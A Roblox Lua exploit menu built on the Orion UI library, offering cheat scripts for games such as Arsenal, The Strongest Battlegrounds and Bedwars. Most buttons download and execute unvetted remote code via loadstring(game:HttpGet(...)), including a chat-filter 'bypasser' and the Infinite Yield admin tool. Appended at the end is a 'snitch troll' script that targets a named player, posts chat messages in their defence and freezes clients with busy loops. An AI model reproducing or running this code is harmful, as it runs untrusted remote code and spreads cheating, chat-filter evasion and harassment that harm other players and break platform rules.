local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/jensonhirst/Orion/main/source')))()

local Window = OrionLib:MakeWindow({
    Name = "Cool Beanz Menu V2",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "CoolBeanzConfig"
})

-- Tabs
local ScriptsTab = Window:MakeTab({
    Name = "Scripts",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local ReskinsTab = Window:MakeTab({
    Name = "Reskins",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local GamesTab = Window:MakeTab({
    Name = "Games",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Scripts Tab Section
local ScriptsSection = ScriptsTab:AddSection({
    Name = "Universal"
})

-- Mobile Cursor System
local MobileCursor = {}
MobileCursor.enabled = false
MobileCursor.gui = nil
MobileCursor.cursor = nil
MobileCursor.connections = {}

function MobileCursor:Create()
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")
    local RunService = game:GetService("RunService")
    local TweenService = game:GetService("TweenService")
    
    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    
    -- Create main GUI
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "MobileCursorGUI"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = playerGui
    
    -- Create main frame
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 120, 0, 50)
    mainFrame.Position = UDim2.new(0, 10, 0.5, -25)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = screenGui
    
    -- Add corner radius
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = mainFrame
    
    -- Add stroke
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(70, 70, 70)
    stroke.Thickness = 1
    stroke.Parent = mainFrame
    
    -- Toggle button
    local toggleButton = Instance.new("TextButton")
    toggleButton.Name = "ToggleButton"
    toggleButton.Size = UDim2.new(1, -10, 1, -10)
    toggleButton.Position = UDim2.new(0, 5, 0, 5)
    toggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    toggleButton.BorderSizePixel = 0
    toggleButton.Text = "Cursor: OFF"
    toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggleButton.TextScaled = true
    toggleButton.Font = Enum.Font.GothamBold
    toggleButton.Parent = mainFrame
    
    -- Button corner
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 6)
    buttonCorner.Parent = toggleButton
    
    -- Create cursor
    local cursorFrame = Instance.new("Frame")
    cursorFrame.Name = "Cursor"
    cursorFrame.Size = UDim2.new(0, 20, 0, 20)
    cursorFrame.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
    cursorFrame.BorderSizePixel = 0
    cursorFrame.Visible = false
    cursorFrame.ZIndex = 1000
    cursorFrame.Parent = screenGui
    
    -- Cursor design
    local cursorCorner = Instance.new("UICorner")
    cursorCorner.CornerRadius = UDim.new(0.5, 0)
    cursorCorner.Parent = cursorFrame
    
    local cursorStroke = Instance.new("UIStroke")
    cursorStroke.Color = Color3.fromRGB(255, 255, 255)
    cursorStroke.Thickness = 2
    cursorStroke.Parent = cursorFrame
    
    -- Cursor inner dot
    local innerDot = Instance.new("Frame")
    innerDot.Size = UDim2.new(0, 6, 0, 6)
    innerDot.Position = UDim2.new(0.5, -3, 0.5, -3)
    innerDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    innerDot.BorderSizePixel = 0
    innerDot.Parent = cursorFrame
    
    local innerCorner = Instance.new("UICorner")
    innerCorner.CornerRadius = UDim.new(0.5, 0)
    innerCorner.Parent = innerDot
    
    self.gui = screenGui
    self.cursor = cursorFrame
    self.toggleButton = toggleButton
    
    -- Touch handling
    local function handleTouch(input)
        if not self.enabled then return end
        
        local camera = workspace.CurrentCamera
        local screenPoint = Vector2.new(input.Position.X, input.Position.Y)
        local unitRay = camera:ScreenPointToRay(screenPoint.X, screenPoint.Y)
        
        -- Update cursor position
        cursorFrame.Position = UDim2.new(0, screenPoint.X - 10, 0, screenPoint.Y - 10)
        
        -- Simulate click
        if input.UserInputState == Enum.UserInputState.Begin then
            -- Click animation
            local clickTween = TweenService:Create(cursorFrame, 
                TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), 
                {Size = UDim2.new(0, 16, 0, 16)}
            )
            clickTween:Play()
            
            clickTween.Completed:Connect(function()
                local returnTween = TweenService:Create(cursorFrame, 
                    TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), 
                    {Size = UDim2.new(0, 20, 0, 20)}
                )
                returnTween:Play()
            end)
            
            -- Perform raycast click
            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
            raycastParams.FilterDescendantsInstances = {player.Character}
            
            local raycastResult = workspace:Raycast(unitRay.Origin, unitRay.Direction * 1000, raycastParams)
            
            if raycastResult then
                local hitPart = raycastResult.Instance
                local clickDetector = hitPart:FindFirstChildOfClass("ClickDetector")
                if clickDetector then
                    fireclickdetector(clickDetector)
                end
            end
        end
    end
    
    -- Toggle function
    local function toggleCursor()
        self.enabled = not self.enabled
        cursorFrame.Visible = self.enabled
        
        if self.enabled then
            toggleButton.Text = "Cursor: ON"
            toggleButton.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
            
            -- Connect touch events
            self.connections.touch = UserInputService.TouchStarted:Connect(handleTouch)
            self.connections.touchMove = UserInputService.TouchMoved:Connect(handleTouch)
            
            -- Pulse animation for cursor
            local function pulseCursor()
                if self.enabled then
                    local pulseTween = TweenService:Create(cursorStroke, 
                        TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), 
                        {Transparency = 0.5}
                    )
                    pulseTween:Play()
                    self.connections.pulse = pulseTween
                end
            end
            pulseCursor()
            
        else
            toggleButton.Text = "Cursor: OFF"
            toggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            
            -- Disconnect events
            for _, connection in pairs(self.connections) do
                if connection then
                    connection:Disconnect()
                end
            end
            self.connections = {}
        end
    end
    
    -- Button click event
    toggleButton.MouseButton1Click:Connect(toggleCursor)
    
    -- Click on cursor to disable
    cursorFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            toggleCursor()
        end
    end)
    
    -- Smooth entrance animation
    mainFrame.Position = UDim2.new(0, -130, 0.5, -25)
    local entranceTween = TweenService:Create(mainFrame, 
        TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), 
        {Position = UDim2.new(0, 10, 0.5, -25)}
    )
    entranceTween:Play()
    
    return screenGui
end

function MobileCursor:Destroy()
    if self.gui then
        self.gui:Destroy()
    end
    for _, connection in pairs(self.connections) do
        if connection then
            connection:Disconnect()
        end
    end
end

-- Add Mobile Cursor to Scripts Tab
ScriptsTab:AddButton({
    Name = "Mobile Cursor",
    Callback = function()
        if MobileCursor.gui then
            MobileCursor:Destroy()
        end
        MobileCursor:Create()
        
        OrionLib:MakeNotification({
            Name = "Mobile Cursor",
            Content = "Mobile cursor GUI loaded! Drag the button to move it around.",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
    end
})

ScriptsTab:AddButton({
	Name = "Thunder Client Mob Fixer",
	Callback = function()
	local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

local screenGui = CoreGui:FindFirstChild("ScreenGui")
if not screenGui then
    warn("ScreenGui not found in CoreGui 😭")
    return
end

local textButton = screenGui:FindFirstChild("TextButton")
if not textButton then
    warn("TextButton not found in ScreenGui 💀")
    return
end

-- Resize
local targetSize = UDim2.new(0, 293, 0, 400)
textButton.Size = targetSize

-- Resize ScrollingFrame if it exists
local scroll = textButton:FindFirstChildWhichIsA("ScrollingFrame", true)
if scroll then
    scroll.Size = targetSize
else
    warn("ScrollingFrame not found in TextButton 😔")
end

-- Draggable Script (works for mobile + PC)
local dragging = false
local dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    textButton.Position = UDim2.new(0, startPos.X.Offset + delta.X, 0, startPos.Y.Offset + delta.Y)
end

textButton.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = textButton.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

textButton.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        update(input)
    end
end)

		end
	})

ScriptsTab:AddButton({
    Name = "Infinite Yield",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    end
})

ScriptsTab:AddButton({
    Name = "Quotas Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Insertl/QuotasHub/main/BETAv1.3"))()
    end
})

-- Games Tab Sections & Buttons
local ArsenalSection = GamesTab:AddSection({
    Name = "Arsenal"
})

GamesTab:AddButton({
    Name = "Thunder Client (OP AS SHIT)",
    Callback = function()
       --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
getgenv().thunderclient = true
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/verified/dca3e69649ed196af0ac6577f743a0ae.lua"))()
    end
})

local TSBSection = GamesTab:AddSection({
    Name = "TSB"
})

GamesTab:AddButton({
    Name = "Death Counter Identifier",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/louismich4el/ItsLouisPlayz-Scripts/main/TSB%20Death%20Counter%20Identifier.lua"))()
    end
})

GamesTab:AddButton({
    Name = "Instant Transmission",
    Callback = function()
        local mouse = game.Players.LocalPlayer:GetMouse()
        local tool = Instance.new("Tool")
        tool.RequiresHandle = false
        tool.Name = "Instant Transmission"

        local teleportAnimationId = "rbxassetid://15957361339"
        local teleportSoundId = "rbxassetid://5066021887"

        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")
        local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

        local teleportAnimation = Instance.new("Animation")
        teleportAnimation.AnimationId = teleportAnimationId
        local teleportTrack = animator:LoadAnimation(teleportAnimation)

        local teleportSound = Instance.new("Sound")
        teleportSound.SoundId = teleportSoundId
        teleportSound.Parent = character:WaitForChild("HumanoidRootPart")

        tool.Activated:Connect(function()
            teleportTrack:Play()
            teleportSound:Play()
            local pos = mouse.Hit + Vector3.new(0, 2.5, 0)
            pos = CFrame.new(pos.X, pos.Y, pos.Z)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
        end)

        tool.Parent = player.Backpack
    end
})

local TrollSection = GamesTab:AddSection({
    Name = "Troll / Cursing"
})

GamesTab:AddButton({
    Name = "Better Bypasser",
    Callback = function()
        loadstring(game:HttpGet("https://github.com/Synergy-Networks/products/raw/main/BetterBypasser/loader.lua"))()
    end
})

local BedwarsSection = GamesTab:AddSection({
    Name = "Bedwars"
})

GamesTab:AddButton({
    Name = "Vape V4 Voidware",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VWExtra/main/installer.lua", true))()
    end
})

-- Reskins Tab Section
local SaitamaSection = ReskinsTab:AddSection({
    Name = "Saitama Reskins"
})

ReskinsTab:AddButton({
    Name = "KJ Reskin",
    Callback = function()
        getgenv().Moveset_Settings = {
            ["ExecuteOnRespawn"] = true,
            ["TSBStyleNotification"] = true,
            ["UseOldCollateralRuin"] = false,
            ["NoWarning"] = true,
            ["NoDeathCounterImages"] = true,
            ["NoBarrageArms"] = true,
            ["NoPreysPerilAttract"] = true,
            ["NoWalls"] = false,
            ["NoTrees"] = false,
            ["RavageTool"] = false,
            ["AdrenalineBoostTool"] = false,
            ["Adrenaline_Multiplier"] = 2,
            ["CustomUppercutAnimation"] = true,
            ["CustomDownslamAnimation"] = true,
            ["CustomIdleAnimation"] = true,
            ["UltNames"] = { "20 SERIES", },
            ["MoveNames"] = {
                ["Normal Punch"] = "Ravaging Kick",
                ["Consecutive Punches"] = "Fist Fusillade",
                ["Shove"] = "Swift Sweep",
                ["Uppercut"] = "Collateral Storm",
                ["Death Counter"] = "Sudden Strike",
                ["Table Flip"] = "Stoic Bomb",
                ["Serious Punch"] = "Limited Flex Works",
                ["Omni Directional Punch"] = "Omni Directional Fists"
            }
        }
        loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToKJ/refs/heads/main/Latest.lua"))()
    end
})

ReskinsTab:AddButton({
    Name = "Gojo Reskin",
    Callback = function()
        getgenv().morph = true
        loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToSorcerer/refs/heads/main/LatestV2.lua"))()
    end
})

-- initialize the UI
OrionLib:Init()
-- 👑 Full Snitch Troll Script with Crash Loops + Smart Filter

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- Your friend’s exact username (case-sensitive)
local snitchName = "GoneGoner3"

-- Words that flag a snitch message
local defenseTriggers = {
	["is"] = true,
	["are"] = true,
	["hacks"] = true,
	["hacking"] = true,
	["cheating"] = true,
	["has"] = true,
	["them"] = true,
}

-- Words that make us ignore the message (like "cap")
local ignoreTriggers = {
	["cap"] = true,
}

-- Smart detector: triggers only if 2+ flagged words found and no ignore words
local function isSnitching(msg)
	msg = msg:lower()
	local susCount = 0

	for word in pairs(defenseTriggers) do
		if msg:find(word) then
			susCount += 1
		end
	end

	for word in pairs(ignoreTriggers) do
		if msg:find(word) then
			return false
		end
	end

	return susCount >= 2
end

-- Crash loop: freezes client for given seconds
local function crashLoop(seconds)
	local start = tick()
	while tick() - start < seconds do
		local a = 0
		a = a + 1
	end
end

-- Chat commands that trigger troll effects with crash loops
local trollCommands = {
	["lg"] = function()
		crashLoop(5) -- freeze 5 seconds
	end,
	["lg2"] = function()
		crashLoop(3) -- freeze 3 seconds
	end,
	["csh"] = function()
		crashLoop(2) -- freeze 2 seconds
	end,
	["crash"] = function()
		error("Crashed by snitch troll")
	end,
}

-- Sends auto defense message "he's not cheating"
local function defend()
	ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("he's not cheating", "All")
end

-- Cursor drift for mobile cursor GUI
local function driftCursor()
	while true do
		task.wait(math.random(5, 9))
		local gui = LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("MobileCursorGUI")
		if gui and gui:FindFirstChild("Cursor") then
			local c = gui.Cursor
			local newPos = c.Position + UDim2.new(0, math.random(-2, 2), 0, math.random(-2, 2))
			c.Position = newPos
		end
	end
end

-- Random touch lag delay for mobile touches
local function touchLag()
	UserInputService.TouchStarted:Connect(function(input)
		if LocalPlayer.Name == snitchName then
			task.wait(math.random(10, 30) / 100) -- 0.1 to 0.3 sec delay
		end
	end)
end

-- Randomly disables one GUI button briefly
local function disableRandomButton()
	while true do
		task.wait(math.random(15, 30))
		if LocalPlayer.Name == snitchName then
			local gui = LocalPlayer:FindFirstChild("PlayerGui")
			if gui then
				for _, btn in pairs(gui:GetDescendants()) do
					if btn:IsA("TextButton") and btn.AutoButtonColor ~= false and btn.Active then
						local oldState = btn.Active
						btn.Active = false
						task.wait(math.random(3, 6))
						btn.Active = oldState
						break
					end
				end
			end
		end
	end
end

-- Setup troll effects for the snitch player
local function setupSnitchTroll(player)
	if player.Name ~= snitchName then return end

	player.Chatted:Connect(function(msg)
		local lowerMsg = msg:lower()

		-- Check for snitching words first
		if isSnitching(msg) then
			task.spawn(defend)
			task.spawn(function()
				crashLoop(2)
			end)
		end

		-- Check for chat commands to troll
		for cmd, func in pairs(trollCommands) do
			if lowerMsg == cmd then
				func()
				break
			end
		end
	end)

	task.spawn(driftCursor)
	task.spawn(touchLag)
	task.spawn(disableRandomButton)
end

-- Setup for all current players
for _, player in ipairs(Players:GetPlayers()) do
	setupSnitchTroll(player)
end

-- Setup for any new player that joins
Players.PlayerAdded:Connect(setupSnitchTroll)



local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

local function onCharacterAdded(character)
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    local humanoid = character:WaitForChild("Humanoid")

    local ANIM_ID_TO_LOCK = 16431491215

    local originalCFrame = nil
    local isLocked = false

    RunService.Heartbeat:Connect(function()
        if isLocked and originalCFrame then
            humanoidRootPart.CFrame = originalCFrame
        end
    end)

    humanoid.AnimationPlayed:Connect(function(track)
        if track.Animation.AnimationId == "rbxassetid://" .. tostring(ANIM_ID_TO_LOCK) then
            originalCFrame = humanoidRootPart.CFrame
            isLocked = true

            track.Stopped:Connect(function()
                isLocked = false
                originalCFrame = nil
            end)
        end
    end)
end

if player.Character then
    onCharacterAdded(player.Character)
end
player.CharacterAdded:Connect(onCharacterAdded)
